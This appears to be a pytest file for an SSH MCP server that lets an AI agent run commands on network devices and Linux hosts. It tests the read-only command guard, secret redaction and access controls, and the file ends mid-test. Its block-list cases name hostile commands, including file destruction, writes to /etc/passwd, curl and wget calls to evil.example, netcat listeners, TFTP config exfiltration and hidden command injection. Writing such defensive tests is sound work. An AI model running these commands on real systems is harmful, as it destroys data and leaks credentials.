"""In-process tests for the SSH MCP server.

The scrapli connection is mocked at the tool import sites
(ssh_mcp.tools.read / ssh_mcp.tools.write), so no test ever opens a real SSH
session.
"""

from __future__ import annotations

import asyncio
import json
from contextlib import asynccontextmanager
from unittest.mock import patch

import pytest
from fastmcp import Client
from fastmcp.exceptions import ToolError

from ssh_mcp.connection import (
    SSHAuthError,
    SSHCommandError,
    SSHConnectError,
    SSHError,
    UnsupportedPlatformError,
    execute,
    is_unix_host,
    open_connection,
)
from ssh_mcp.safety import check_read_only, redact
from ssh_mcp.server import _resolve_transport, build_server
from ssh_mcp.settings import CredentialProfile, Settings
from ssh_mcp.shell import ShellConnection

# --- fixtures / helpers ---------------------------------------------------


def make_settings(write_enabled: bool = False, audit_log: str | None = None) -> Settings:
    return Settings(
        write_enabled=write_enabled,
        credentials={"default": CredentialProfile(name="default", username="u", password="p")},
        known_hosts=None,
        timeout_socket=15.0,
        timeout_ops=30.0,
        # "off" keeps _build_driver unit tests from touching the filesystem.
        host_key_policy="off",
        audit_log=audit_log,
    )


class FakeResponse:
    def __init__(self, channel_input="", result="", failed=False):
        self.channel_input = channel_input
        self.result = result
        self.failed = failed
        self.elapsed_time = 0.01


class FakeDriver:
    def __init__(self, command_result="OK", failed=False, config_failed=False, raise_on_call=None):
        self._command_result = command_result
        self._failed = failed
        self._config_failed = config_failed
        self._raise_on_call = raise_on_call  # 1-based call index that raises
        self._calls = 0

    async def send_command(self, command):
        self._calls += 1
        if self._raise_on_call is not None and self._calls >= self._raise_on_call:
            raise OSError("connection reset by peer")
        return FakeResponse(channel_input=command, result=self._command_result, failed=self._failed)

    async def send_configs(self, commands, stop_on_failed=True):
        return [
            FakeResponse(channel_input=c, result="applied", failed=self._config_failed)
            for c in commands
        ]


def fake_open_connection(driver):
    @asynccontextmanager
    async def _open(*_args, **_kwargs):
        yield driver

    return _open


def failing_open_connection(exc):
    """An open_connection stand-in that raises `exc` on entry."""

    @asynccontextmanager
    async def _open(*_args, **_kwargs):
        raise exc
        yield  # type: ignore[unreachable]  # pragma: no cover — required for generator syntax

    return _open


# --- safety unit tests ----------------------------------------------------


def test_check_read_only_allows_diagnostics():
    assert check_read_only("show interfaces brief") is None
    assert check_read_only("display vlan") is None
    assert check_read_only("show running-config | include ntp") is None
    assert check_read_only("ip -br addr") is None


def test_check_read_only_blocks_destructive():
    assert check_read_only("reload") is not None
    assert check_read_only("configure terminal") is not None
    assert check_read_only("write memory") is not None
    assert check_read_only("show run ; reload") is not None
    assert check_read_only("cat /etc/passwd | rm -rf /tmp") is not None
    assert check_read_only("echo hi > /etc/hosts") is not None


def test_check_read_only_blocks_command_substitution():
    # Destructive verbs hidden inside $(...) or backticks must still be caught.
    assert check_read_only("echo $(reload)") is not None
    assert check_read_only("echo `erase startup-config`") is not None
    assert check_read_only("logger $(rm -rf /var)") is not None


def test_check_read_only_blocks_line_separator_injection():
    # A device treats CR / vertical-tab / form-feed as Enter too — a destructive
    # verb after one must not ride past the leading benign command.
    assert check_read_only("show version\rreload") is not None
    assert check_read_only("show clock\rerase startup-config") is not None
    assert check_read_only("show version\x0breload") is not None
    assert check_read_only("show version\x0cwrite memory") is not None


def test_check_read_only_blocks_redirection_without_space():
    # Redirection writes a file on a generic/Linux host — the read tools must
    # reject it even without the leading space the old pattern required.
    assert check_read_only("echo pwned>/etc/cron.d/x") is not None
    assert check_read_only("echo pwned>>/etc/passwd") is not None
    assert check_read_only("cat /proc/cpuinfo 2>/tmp/x") is not None
    assert check_read_only("echo pwned >| /etc/passwd") is not None
    assert check_read_only("echo hi > /etc/hosts") is not None  # the with-space form too
    # Comparison / arrow operators are NOT redirection and must still pass.
    assert check_read_only("awk '$3 >= 5' /var/log/syslog") is None
    assert check_read_only("show running-config | include ntp") is None


def test_check_read_only_blocks_write_pipe_modifiers():
    # IOS/NX-OS `| redirect` / `| append` write or exfiltrate the output.
    assert check_read_only("show running-config | redirect tftp://10.0.0.9/cfg") is not None
    assert check_read_only("show running-config | append flash:cfg.txt") is not None
    # `| include` / `| begin` filters are read-only and must still pass.
    assert check_read_only("show running-config | begin interface") is None


def test_check_read_only_honours_extra_patterns():
    assert check_read_only("show forbidden-thing", ["forbidden-thing"]) is not None
    assert check_read_only("show interfaces", ["forbidden-thing"]) is None


def test_is_unix_host():
    assert is_unix_host("linux")
    assert is_unix_host("generic")
    # The ArubaOS banner shells live in _GENERIC_PLATFORMS but are network CLIs,
    # NOT Unix shells — the allowlist must not apply to them.
    assert not is_unix_host("aruba-os-switch")
    assert not is_unix_host("aruba-os")
    assert not is_unix_host("cisco-ios")


def test_unix_allowlist_blocks_denylist_bypasses():
    # Every one of these slipped past the denylist alone (lead-anchored), so on
    # a Unix host they must now be rejected by the positive allowlist / the new
    # mutating-subcommand guards.
    bypasses = [
        "sudo reboot",
        "bash -c 'rm -rf /tmp/x'",
        "sh -c reboot",
        "exec reboot",
        "env reboot",
        "nohup reboot",
        "time reboot",
        "command reboot",
        "xargs rm < list",
        "python3 -c \"open('/etc/cron.d/x','w')\"",
        "perl -e 'unlink \"/etc/hosts\"'",
        "sed -i 's/x/y/' /etc/hosts",
        "find / -name '*.log' -delete",
        "cp /bin/sh /tmp/rootsh",
        "ln -sf /etc/shadow /tmp/s",
        "ip addr add 10.0.0.1/24 dev eth0",
        "ip -6 route add default via fe80::1",
        "ip link set eth0 down",
        "ip netns exec ns reboot",
        "sysctl -w net.ipv4.ip_forward=1",
        "sysctl net.ipv4.ip_forward=1",
        "systemctl stop sshd",
        "systemctl --user stop foo",
        "service nginx restart",
        "journalctl --vacuum-size=1M",
        "dmesg -C",
        "date -s '2020-01-01'",
        "hostname newname",
    ]
    for cmd in bypasses:
        assert check_read_only(cmd, unix_host=True) is not None, f"should block: {cmd}"


def test_unix_allowlist_allows_safe_reads():
    reads = [
        "cat /etc/os-release",
        "grep -i version /etc/os-release",
        "head -50 /var/log/messages | tail -20",
        "ip addr show",
        "ip -br link",
        "ip route get 8.8.8.8",
        "ip netns list",
        "ss -tlnp",
        "netstat -rn",
        "df -h",
        "du -sh /var",
        "uptime",
        "uname -a",
        "ps aux",
        "free -m",
        "journalctl -u sshd --no-pager -n 100",
        "systemctl status sshd",
        "systemctl is-active sshd",
        "service --status-all",
        "sysctl net.ipv4.ip_forward",
        "dig +short example.com",
        "date",
        "hostname -f",
        "which python3",
    ]
    for cmd in reads:
        assert check_read_only(cmd, unix_host=True) is None, f"should allow: {cmd}"


def test_unix_allowlist_extra_extends():
    assert check_read_only("tcpdump -c 1", unix_host=True) is not None
    assert check_read_only("tcpdump -c 1", unix_host=True, allow_extra=["tcpdump"]) is None


def test_unix_allowlist_does_not_affect_network_path():
    # unix_host defaults to False, so the network/denylist behaviour is
    # unchanged: `show`/`awk` etc. are still allowed (they are not Unix hosts).
    assert check_read_only("show version") is None
    assert check_read_only("display vlan") is None
    assert check_read_only("awk '$3 >= 5' /var/log/syslog") is None
    assert check_read_only("ip -br addr") is None
    # ...but a Unix host would reject bare awk (not on the read allowlist).
    assert check_read_only("awk '$3 >= 5' /var/log/syslog", unix_host=True) is not None


def test_denylist_guards_apply_on_all_platforms():
    # The new mutating-subcommand guards are in the denylist, so they fire even
    # without unix_host=True (belt-and-suspenders for the network shells).
    assert check_read_only("ip addr add 10.0.0.1/24 dev eth0") is not None
    assert check_read_only("systemctl stop sshd") is not None
    assert check_read_only("ip netns exec ns sh") is not None
    # Read forms of the same tools stay allowed on the network path.
    assert check_read_only("ip addr show") is None
    assert check_read_only("systemctl status sshd") is None


def test_unix_allowlist_blocks_second_order_mutation():
    # Allowlisted read tools that carry a mutating side-door (write via file,
    # batch mode, console/clock changes) must still be rejected on Unix hosts.
    vectors = [
        "ip route restore < /tmp/routes",
        "ip -b /tmp/cmds",
        "ip -batch /tmp/cmds",
        "ip -force -batch /tmp/cmds",
        "sysctl -p /tmp/evil.conf",
        "sysctl --system",
        "systemctl clean foo",
        "systemctl freeze foo",
        "date 010112002020",
        "hostname -F /tmp/name",
        "hostname -b newname",
        "dmesg -n 1",
        "dmesg -D",
        "dmesg -C",
    ]
    for cmd in vectors:
        assert check_read_only(cmd, unix_host=True) is not None, f"should block: {cmd}"


def test_unix_allowlist_preserves_case_significant_read_flags():
    # These differ from a write flag only by case (-f vs -F, -d vs -D) — the
    # guards are case-scoped so the read form is NOT collateral-damaged.
    for cmd in ["hostname -f", "hostname -A", "dmesg -d", "dmesg -e", "date +%s", "date -R"]:
        assert check_read_only(cmd, unix_host=True) is None, f"should allow: {cmd}"


def test_redact_strips_secrets():
    assert "SUPERSECRET" not in redact("snmp-server community SUPERSECRET ro")
    assert "<REDACTED>" in redact("username admin secret 5 abc123hash")
    assert "<REDACTED>" in redact("enable secret 5 deadbeef")


def test_redact_key_ciphertext():
    # Aruba CX form: the secret follows the ciphertext/plaintext keyword.
    out = redact("radius-server host 10.1.1.1 key ciphertext AQBapSECRETBLOB")
    assert "AQBapSECRETBLOB" not in out
    assert "<REDACTED>" in out
    assert "MyNtpSecret" not in redact("ntp key plaintext MyNtpSecret")


def test_redact_masks_pem_private_key():
    # A multi-line PEM private key embedded in device output (running-config,
    # `show crypto`) must not leak — the per-line redactions can't catch it.
    for label in ("RSA PRIVATE KEY", "OPENSSH PRIVATE KEY", "EC PRIVATE KEY", "PRIVATE KEY"):
        text = (
            f"crypto key dump\n-----BEGIN {label}-----\n"
            "MIIEowIBAAKCAQEAsecretkeymaterialLINE1\n"
            "secretkeymaterialLINE2deadbeef\n"
            f"-----END {label}-----\ntrailing line"
        )
        out = redact(text)
        assert "secretkeymaterialLINE1" not in out, f"{label} body leaked"
        assert "secretkeymaterialLINE2deadbeef" not in out, f"{label} body leaked"
        assert "<REDACTED>" in out
        # The header/footer and surrounding context are preserved for readability.
        assert f"-----BEGIN {label}-----" in out
        assert f"-----END {label}-----" in out
        assert "trailing line" in out


def test_redact_real_aruba_cx_config_shapes():
    """Redaction holds on the real AOS-CX running-config line shapes verified
    against a live switch — secret values here are fakes. Locks in coverage so
    a future regex change cannot silently start leaking one of these forms."""
    config = "\n".join(
        [
            "user admin group administrators password ciphertext FAKEuserPW",
            "radius-server tracking user-name radius-tracking-user password ciphertext FAKEtrackPW",
            "tacacs-server host 192.0.2.11 key ciphertext FAKEtacacsKEY",
            "radius-server host 192.0.2.11 key ciphertext FAKEradiusKEY "
            "tracking enable clearpass-username api-dur "
            "clearpass-password ciphertext FAKEclearpassPW",
            "radius dyn-authorization client 192.0.2.11 secret-key ciphertext FAKEdynKEY",
            "snmp-server community FAKEcommunity",
            "    neighbor 192.0.2.101 password ciphertext FAKEbgpPW",
        ]
    )
    out = redact(config)
    for secret in (
        "FAKEuserPW",
        "FAKEtrackPW",
        "FAKEtacacsKEY",
        "FAKEradiusKEY",
        "FAKEclearpassPW",
        "FAKEdynKEY",
        "FAKEcommunity",
        "FAKEbgpPW",
    ):
        assert secret not in out, f"{secret} leaked through redact()"


def test_strip_terminal_noise():
    from ssh_mcp.safety import strip_terminal_noise

    # The real VyOS 1.4.4 line shape: ESC= prefixes the output and ESC>
    # precedes the prompt (verified live against a real device).
    raw = "\x1b=Version:          VyOS 1.4.4\nRelease train:    sagitta\n\x1b>admin@vyos1:~$"
    out = strip_terminal_noise(raw)
    assert "\x1b" not in out
    assert out.startswith("Version:")
    assert out.endswith("admin@vyos1:~$")
    # Output with no escape sequences is returned unchanged.
    assert strip_terminal_noise("show version\nVyOS 1.4.4") == "show version\nVyOS 1.4.4"
    # CSI colour / cursor sequences are removed whole (not half-stripped).
    assert strip_terminal_noise("\x1b[31mred\x1b[0m") == "red"
    assert strip_terminal_noise("a\x1b[2J\x1b[Hb") == "ab"
    # OSC (window-title) sequences are removed.
    assert strip_terminal_noise("x\x1b]0;title\x07y") == "xy"
    # A literal '=' / '>' in real content (not preceded by ESC) is untouched.
    assert strip_terminal_noise("mtu >= 1500 = ok") == "mtu >= 1500 = ok"


# --- tool tests -----------------------------------------------------------


async def test_run_command_success():
    mcp = build_server(make_settings())
    driver = FakeDriver(command_result="GigabitEthernet1/0/1 is up")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "show interfaces"},
            )
    payload = result.structured_content
    assert "GigabitEthernet" in payload["output"]
    assert payload["failed"] is False


async def test_run_command_rejects_destructive():
    mcp = build_server(make_settings())
    async with Client(mcp) as client:
        with pytest.raises(ToolError):
            await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "reload"},
            )


async def test_run_command_output_is_redacted():
    mcp = build_server(make_settings())
    driver = FakeDriver(command_result="snmp-server community SUPERSECRET ro")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_command",
                {"host": "sw1", "platform": "cisco-iosxe", "command": "show running-config"},
            )
    out = result.structured_content["output"]
    assert "SUPERSECRET" not in out
    assert "<REDACTED>" in out


async def test_run_command_strips_terminal_noise():
    # ESC= / ESC> keypad-mode codes leaked by VyOS must not reach the agent.
    mcp = build_server(make_settings())
    driver = FakeDriver(command_result="\x1b=VyOS 1.4.4 running\x1b>host:~$")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_command",
                {"host": "vyos1", "platform": "vyos", "command": "show version"},
            )
    out = result.structured_content["output"]
    assert "\x1b" not in out
    assert "VyOS 1.4.4 running" in out


async def test_run_commands_batch():
    mcp = build_server(make_settings())
    driver = FakeDriver(command_result="ok")
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_commands",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "commands": ["show version", "show vlan brief"],
                },
            )
    payload = result.structured_content
    assert len(payload["results"]) == 2
    assert payload["failed"] is False


async def test_run_commands_partial_results_on_session_drop():
    mcp = build_server(make_settings())
    driver = FakeDriver(raise_on_call=2)  # 1st command ok, 2nd drops the session
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_run_commands",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "commands": ["show version", "show vlan brief", "show run"],
                },
            )
    payload = result.structured_content
    # First succeeded, second errored, third never ran — partial results returned.
    assert len(payload["results"]) == 2
    assert payload["results"][0]["failed"] is False
    assert payload["results"][1]["failed"] is True
    assert payload["results"][1]["error"]
    assert payload["failed"] is True


async def test_run_command_session_error_raises():
    mcp = build_server(make_settings())
    driver = FakeDriver(raise_on_call=1)
    with patch("ssh_mcp.tools.read.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            with pytest.raises(ToolError):
                await client.call_tool(
                    "ssh_run_command",
                    {"host": "sw1", "platform": "cisco-iosxe", "command": "show version"},
                )


async def test_run_commands_rejects_if_any_destructive():
    mcp = build_server(make_settings())
    async with Client(mcp) as client:
        with pytest.raises(ToolError):
            await client.call_tool(
                "ssh_run_commands",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "commands": ["show version", "erase startup-config"],
                },
            )


async def test_write_tool_hidden_when_disabled():
    mcp = build_server(make_settings(write_enabled=False))
    names = {t.name for t in await mcp.list_tools()}
    assert "ssh_send_config" not in names
    assert "ssh_run_command" in names


async def test_write_tool_present_when_enabled():
    mcp = build_server(make_settings(write_enabled=True))
    names = {t.name for t in await mcp.list_tools()}
    assert "ssh_send_config" in names


async def test_send_config_applies():
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver()
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "config_commands": ["interface Gi1/0/1", "description uplink"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert payload["failed"] is False
    assert len(payload["commands"]) == 2


async def test_send_config_rejects_bad_confirm():
    mcp = build_server(make_settings(write_enabled=True))
    async with Client(mcp) as client:
        with pytest.raises(ToolError):
            await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "config_commands": ["description test"],
                    "confirm": "no",
                },
            )


async def test_send_config_generic_platform_applies():
    # Generic/shell platforms (ProCurve, ArubaOS, Linux) take the per-command
    # loop, not scrapli config mode — every command is sent in order.
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver(command_result="applied")
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "aruba-os-switch",
                    "config_commands": ["vlan 100", "name TEST"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert payload["failed"] is False
    assert driver._calls == 2  # both commands ran over the shell


async def test_send_config_generic_stops_on_rejected():
    # A rejected command halts the apply — later commands must not run.
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver(failed=True)
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "aruba-os-switch",
                    "config_commands": ["bad command", "never runs"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert payload["failed"] is True
    assert driver._calls == 1  # stopped after the first rejected command


async def test_send_config_generic_save_note():
    # `save` does not apply to generic/linux hosts — it is reported, not run.
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver(command_result="ok")
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "host",
                    "platform": "linux",
                    "config_commands": ["echo hi"],
                    "confirm": "yes",
                    "save": True,
                },
            )
    payload = result.structured_content
    assert payload["saved"] is False
    assert "not applicable" in (payload["note"] or "")


async def test_send_config_generic_partial_on_session_drop():
    # A mid-apply session drop returns a partial result, not a bare error.
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver(raise_on_call=2)  # 1st applies, 2nd drops the session
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "aruba-os-switch",
                    "config_commands": ["vlan 100", "name TEST"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert payload["failed"] is True
    assert payload["note"] and "dropped" in payload["note"].lower()
    # The command applied before the drop is still reported.
    assert "vlan 100" in payload["output"]


async def test_all_tools_prefixed():
    mcp = build_server(make_settings(write_enabled=True))
    bad = [t.name for t in await mcp.list_tools() if not t.name.startswith("ssh_")]
    assert not bad, f"Unprefixed tools: {bad}"


async def test_server_version_resource():
    mcp = build_server(make_settings())
    async with Client(mcp) as client:
        result = await client.read_resource("server://version")
    assert "changelog" in result[0].text


async def test_unsupported_platform_raises():
    settings = make_settings()
    with pytest.raises(UnsupportedPlatformError):
        async with open_connection("host", "bogus-os", settings.get_profile("default"), settings):
            pass


def test_ssh_errors_are_tool_errors():
    # SSHError subclasses ToolError so messages reach the agent without
    # per-tool translation.
    for cls in (SSHError, SSHAuthError, SSHConnectError, UnsupportedPlatformError):
        assert issubclass(cls, ToolError)


async def test_check_reachable_success():
    # ssh_check_reachable uses a bare SSH probe, not a platform driver: a
    # healthy FortiGate used to report reachable=False purely because the
    # generic driver's prompt pattern could not match "fgt1-p # ".
    mcp = build_server(make_settings())

    async def ok(*args, **kwargs):
        return None

    with patch("ssh_mcp.tools.read.probe_reachable", ok):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_check_reachable", {"host": "sw1", "platform": "linux"}
            )
    payload = result.structured_content
    assert payload["reachable"] is True
    assert payload["authenticated"] is True


async def test_check_reachable_auth_failure():
    mcp = build_server(make_settings())
    exc = SSHAuthError("SSH authentication failed for sw1: bad creds.")

    async def boom(*args, **kwargs):
        raise exc

    with patch("ssh_mcp.tools.read.probe_reachable", boom):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_check_reachable", {"host": "sw1", "platform": "linux"}
            )
    payload = result.structured_content
    # An auth failure means the host answered SSH — it is reachable.
    assert payload["reachable"] is True
    assert payload["authenticated"] is False
    assert payload["error"]


async def test_check_reachable_unreachable():
    mcp = build_server(make_settings())
    exc = SSHConnectError("Could not connect to sw1:22: timed out.")

    async def boom(*args, **kwargs):
        raise exc

    with patch("ssh_mcp.tools.read.probe_reachable", boom):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_check_reachable", {"host": "sw1", "platform": "linux"}
            )
    payload = result.structured_content
    assert payload["reachable"] is False
    assert payload["authenticated"] is False


# --- security hardening tests --------------------------------------------


def test_check_read_only_blocks_debug_and_pivot():
    # debug is state-changing and can DoS a router.
    assert check_read_only("debug all") is not None
    assert check_read_only("undebug all") is not None
    # Outbound connections turn the device into a pivot / exfil point.
    assert check_read_only("ssh root@10.0.0.9") is not None
    assert check_read_only("telnet 10.0.0.9") is not None
    assert check_read_only("scp file user@host:/tmp") is not None
    assert check_read_only("curl http://evil.example/x") is not None
    assert check_read_only("wget http://evil.example/x") is not None
    assert check_read_only("nc -l 4444") is not None
    # Legit diagnostics must still pass.
    assert check_read_only("show debugging") is None
    assert check_read_only("ping 8.8.8.8") is None
    assert check_read_only("traceroute 8.8.8.8") is None


async def test_execute_redacts_secret_in_error():
    # A secret inside a (write-mode) command must not leak into SSHCommandError.
    driver = FakeDriver(raise_on_call=1)
    with pytest.raises(SSHCommandError) as excinfo:
        await execute(driver, "snmp-server community SUPERSECRETCOMMUNITY ro")
    assert "SUPERSECRETCOMMUNITY" not in str(excinfo.value)
    assert "<REDACTED>" in str(excinfo.value)


async def test_send_config_redacts_echoed_commands():
    mcp = build_server(make_settings(write_enabled=True))
    driver = FakeDriver()
    with patch("ssh_mcp.tools.write.open_connection", fake_open_connection(driver)):
        async with Client(mcp) as client:
            result = await client.call_tool(
                "ssh_send_config",
                {
                    "host": "sw1",
                    "platform": "cisco-iosxe",
                    "config_commands": ["snmp-server community SECRETWRITECOMM ro"],
                    "confirm": "yes",
                },
            )
    payload = result.structured_content
    assert "SECRETWRITECOMM" not in str(payload["commands"])


def test_resolve_transport_refuses_http_without_token(monkeypatch):
    monkeypatch.setenv("MCP_TRANSPORT", "http")
    monkeypatch.delenv("SSH_MCP_MCP_AUTH_TOKEN", raising=False)
    with pytest.raises(SystemExit):
        _resolve_transport()


def test_resolve_transport_allows_http_with_token(monkeypatch):
    monkeypatch.setenv("MCP_TRANSPORT", "http")
    monkeypatch.setenv("SSH_MCP_MCP_AUTH_TOKEN", "a-real-token")
    assert _resolve_transport() == "http"


def test_resolve_transport_stdio_default(monkeypatch):
    monkeypatch.delenv("MCP_TRANSPORT", raising=False)
    assert _resolve_transport() == "stdio"


def test_http_app_refuses_to_serve_without_token(monkeypatch):
    # `uvicorn ssh_mcp.server:http_app` must not expose an unauthenticated
    # SSH-executing endpoint, even though it bypasses main()'s _resolve_transport
    # guard. Without a token, http_app 503s every request instead.
    from starlette.testclient import TestClient

    from ssh_mcp.server import _build_http_app

    monkeypatch.delenv("SSH_MCP_MCP_AUTH_TOKEN", raising=False)
    app = _build_http_app(build_server(make_settings()))
    client = TestClient(app)
    for method, path in [("post", "/mcp"), ("get", "/health"), ("get", "/anything")]:
        resp = getattr(client, method)(path)
        assert resp.status_code == 503
        assert "SSH_MCP_MCP_AUTH_TOKEN" in resp.text


def test_http_app_real_when_token_present(monkeypatch):
    # With a token configured, the real FastMCP app is exposed (not the refuser).
    from ssh_mcp.server import _build_http_app

    monkeypatch.setenv("SSH_MCP_MCP_AUTH_TOKEN", "a-real-token")
    app = _build_http_app(build_server(make_settings()))
    paths = [getattr(r, "path", None) for r in app.routes]
    assert paths != ["/{path:path}"]  # not the single-route refuser
    assert "/health" in paths  # the real app's custom routes are present


def test_credentials_kept_out_of_repr():
    # A stray repr()/f-string of a profile or Settings (e.g. in a traceback)
    # must not disclose the password, enable secret, key passphrase, or token.
    settings = Settings(
        write_enabled=False,
        credentials={
            "default": CredentialProfile(
                name="default",
                username="u",
                password="PWSECRET",
                enable_secret="ENSECRET",
                private_key_passphrase="PPSECRET",
            )
        },
        known_hosts=None,
        timeout_socket=15.0,
        timeout_ops=30.0,
        mcp_auth_token="TOKENSECRET",
    )
    blob = repr(settings) + repr(settings.credentials["default"])
    for secret in ("PWSECRET", "ENSECRET", "PPSECRET", "TOKENSECRET"):
        assert secret not in blob, f"{secret} leaked through repr()"


# --- SSH key authentication tests ----------------------------------------


def test_load_settings_key_auth_shorthand(monkeypatch):
    monkeypatch.setenv("SSH_MCP_USERNAME", "automation")
    monkeypatch.delenv("SSH_MCP_PASSWORD", raising=False)
    monkeypatch.setenv("SSH_MCP_PRIVATE_KEY", "~/.ssh/id_ed25519")
    monkeypatch.setenv("SSH_MCP_PRIVATE_KEY_PASSPHRASE", "keypassphrase")
    monkeypatch.delenv("SSH_MCP_CREDENTIALS", raising=False)
    from ssh_mcp.settings import load_settings

    profile = load_settings().credentials["default"]
    assert profile.private_key == "~/.ssh/id_ed25519"
    assert profile.private_key_passphrase == "keypassphrase"
    assert profile.password == ""


def test_load_settings_key_auth_json(monkeypatch):
    monkeypatch.setenv(
        "SSH_MCP_CREDENTIALS",
        '{"keyauth":{"username":"auto","private_key":"/keys/id","private_key_passphrase":"pp"}}',
    )
    monkeypatch.delenv("SSH_MCP_USERNAME", raising=False)
    from ssh_mcp.settings import load_settings

    profile = load_settings().credentials["keyauth"]
    assert profile.private_key == "/keys/id"
    assert profile.private_key_passphrase == "pp"


def test_get_profile_requires_an_auth_method():
    settings = Settings(
        write_enabled=False,
        credentials={"noauth": CredentialProfile(name="noauth", username="u")},
        known_hosts=None,
        timeout_socket=15.0,
        timeout_ops=30.0,
    )
    with pytest.raises(ValueError):
        settings.get_profile("noauth")  # username but no password and no key


def test_get_profile_accepts_key_only():
    settings = Settings(
        write_enabled=False,
        credentials={"k": CredentialProfile(name="k", username="u", private_key="/k/id")},
        known_hosts=None,
        timeout_socket=15.0,
        timeout_ops=30.0,
    )
    assert settings.get_profile("k").private_key == "/k/id"


def test_build_driver_rejects_missing_key_file():
    from ssh_mcp.connection import _build_driver

    settings = make_settings()
    profile = CredentialProfile(name="k", username="u", private_key="/no/such/key/file/id_ed25519")
    with pytest.raises(ToolError):
        _build_driver("h", "linux", profile, settings, 22, 30.0)


def test_build_driver_accepts_key_file(tmp_path):
    from ssh_mcp.connection import _build_driver

    key = tmp_path / "id_test"
    key.write_text("dummy-private-key-material")
    settings = make_settings()
    profile = CredentialProfile(
        name="k",
        username="u",
        private_key=str(key),
        private_key_passphrase="pp",
    )
    driver = _build_driver("h", "linux", profile, settings, 22, 30.0)
    assert driver is not None


# --- TOFU host-key tests -------------------------------------------------


def test_ensure_known_hosts_file_creates(tmp_path):
    from ssh_mcp.hostkeys import ensure_known_hosts_file

    path = tmp_path / "sub" / "known_hosts"
    ensure_known_hosts_file(str(path))
    assert path.is_file()


def test_classify_host_key_new_known_changed(tmp_path):
    from ssh_mcp.hostkeys import append_host_key, classify_host_key

    kh = str(tmp_path / "kh")
    assert classify_host_key(kh, "sw1", "ssh-ed25519", "AAAAkey1") == "new"
    append_host_key(kh, "sw1", "ssh-ed25519", "AAAAkey1")
    assert classify_host_key(kh, "sw1", "ssh-ed25519", "AAAAkey1") == "known"
    # Same host + same key type, different value → changed (the MITM signal).
    assert classify_host_key(kh, "sw1", "ssh-ed25519", "AAAAkey2") == "changed"
    # Same host, a key type not yet recorded → new (accept-new).
    assert classify_host_key(kh, "sw1", "ssh-rsa", "AAAArsa") == "new"


def test_append_host_key_is_idempotent(tmp_path):
    from ssh_mcp.hostkeys import append_host_key

    kh = str(tmp_path / "kh")
    append_host_key(kh, "sw1", "ssh-ed25519", "AAAAk")
    append_host_key(kh, "sw1", "ssh-ed25519", "AAAAk")
    with open(kh) as fh:
        assert fh.read().count("sw1") == 1


def test_build_driver_tofu_creates_known_hosts(tmp_path):
    from ssh_mcp.connection import _build_driver

    kh = tmp_path / "kh"
    settings = Settings(
        write_enabled=False,
        credentials={},
        known_hosts=str(kh),
        timeout_socket=15.0,
        timeout_ops=30.0,
        host_key_policy="tofu",
    )
    driver = _build_driver(
        "h",
        "linux",
        CredentialProfile(name="d", username="u", password="p"),
        settings,
        22,
        30.0,
    )
    assert driver is not None
    assert kh.is_file()  # tofu ensured the pin store exists


def test_build_driver_strict_requires_existing_file(tmp_path):
    from ssh_mcp.connection import _build_driver

    settings = Settings(
        write_enabled=False,
        credentials={},
        known_hosts=str(tmp_path / "does-not-exist"),
        timeout_socket=15.0,
        timeout_ops=30.0,
        host_key_policy="strict",
    )
    with pytest.raises(ToolError):
        _build_driver(
            "h",
            "linux",
            CredentialProfile(name="d", username="u", password="p"),
            settings,
            22,
            30.0,
        )


# --- connection allowlist tests ------------------------------------------


def test_check_host_allowed():
    from ssh_mcp.safety import check_host_allowed

    assert check_host_allowed("anything", []) is None  # empty = allow all
    assert check_host_allowed("sw1.lab.example.com", ["*.lab.example.com"]) is None
    assert check_host_allowed("10.1.2.3", ["10.0.0.0/8"]) is None
    assert check_host_allowed("sw1", ["sw1"]) is None
    assert check_host_allowed("evil.com", ["*.lab.example.com"]) is not None
    assert check_host_allowed("192.168.1.1", ["10.0.0.0/8"]) is not None


async def test_open_connection_rejects_disallowed_host():
    settings = Settings(
        write_enabled=False,
